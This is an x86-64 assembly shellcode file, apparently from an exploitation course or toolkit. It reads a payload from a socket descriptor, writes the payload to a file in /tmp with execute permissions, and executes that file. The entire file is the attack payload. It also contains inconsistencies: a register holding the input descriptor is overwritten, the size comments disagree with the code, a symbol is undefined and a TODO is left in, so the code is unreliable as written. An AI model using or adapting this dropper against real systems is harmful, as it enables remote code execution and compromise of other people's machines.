	;; Evan Jensen 64bit Put a file in /tmp and execve it shellcode
	;; Paolo Soto
	;; Sun Mar 10 21:37:35 EDT 2013

	;; %eax = syscall number
	;; args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
	;; args = rdi, rsi, rdx, rcx, r8, r9, then stack
BITS 64 
	global main
	
	%include "../include/syscalls64.s"

	%define openflags 0x42 ; O_CREAT|O_RDWR
	%define size 0xffff

	; assumption - rbx has the input (socket)
		
main:

	; rdi = 0
	; rsi = size
	; rdx = 0x3
	; rcx = 0x2
	; r8  = rbx
	; r9  = 0

	; mmap(0, 1M, PROT_READ|PROT_WRITE, MAP_PRIVATE, input_fd, 0)
	mov r8, rdx		; r8 = input

	xor rdi, rdi		; rdi = 0

	mov rdx, rdi
	mov rax, rdi
	mov rcx, rdi
	mov r8, rdi
	mov r9, rdi

	mov rsi, rdi
	mov sil, 0x1
	shl rsi, 22		; rsi = 4M

	mov dl, 0x3		; rdx = 0x3
	mov cl, 0x2		; rdl = 0x2

	mov al, __NR_mmap
	syscall 		; call mmap

	; rax has the mmap buffer
	; temporary assignments:
	mov r8, rax		; r8 = buffer 
	mov r9, rsi		; r9 = size

	; open(filename, O_CREAT|O_RDWR, 0700)
	xor rax, rax
	mov rdi, rax
	mov rdx, rax
	push rax,
	push qword stackcookie  ; TODO verify this
	push 0x706d742f		; stack = /tmp/filename\0
	mov rdi, rsp		; rdi = stack
	mov rsi, rax	
	mov sil, 0x42		; ril = O_CREAT|O_RDWR
	mov dl, 0x7
	shl dl, 0x6
	mov al, __NR_open
	syscall			; call open
	
	; write(output, buffer, size)
	mov rdi, rax		; rdi = output
	mov rsi, r8		; rsi = buffer
	mov rdx, r9		; rdx = size
	xor rax, rax
	mov al, __NR_write
	syscall			; call write

	; exec(filename, 0, 0)
	mov rdi, rsp		; rdi = filename
	xor rsi, rsi		; rsi = 0
	mov rdx, rsi		; rdx = 0
	mov rax, rsi		; rax = 0
	mov al, __NR_execve	
	syscall			; call execve
